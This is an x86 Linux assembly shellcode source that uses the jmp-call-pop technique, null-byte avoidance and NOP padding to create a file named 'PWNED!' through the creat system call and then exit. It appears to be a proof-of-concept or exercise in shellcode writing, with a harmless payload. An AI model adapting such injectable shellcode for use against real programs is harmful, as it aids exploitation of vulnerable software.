Section   .text
global _start

_start:
	jmp short PushFilenameAdressToStack
shellcode:
	; sys_creat
	push 0x08
	pop eax
	
	; get filename address
	pop ebx
	; set null byte
	xor edx, edx
	mov [ebx + 0x06], dl

	; set file permissions
	push word 0544o
	pop ecx

	; create file using system call
	int 0x80
	
	; exit(0)
	xor eax, eax
	inc eax
	xor ebx, ebx
	int 0x80
PushFilenameAdressToStack:
	call shellcode
	db 'PWNED!X'
	nop
	nop
	nop
	nop
	nop
